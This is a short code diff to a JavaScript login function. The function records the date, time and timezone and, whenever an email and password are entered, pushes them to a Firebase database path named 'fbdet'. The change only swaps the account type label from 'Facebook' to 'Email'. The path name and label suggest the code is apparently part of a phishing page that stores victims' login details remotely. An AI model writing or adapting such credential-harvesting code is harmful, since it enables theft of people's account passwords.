@@ -108,7 +108,7 @@ function login() {
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  var accountType = 'Facebook';
+  var accountType = 'Email';
 
   if (email !== '' && password !== '') {
     firebase.database().ref('fbdet').push({
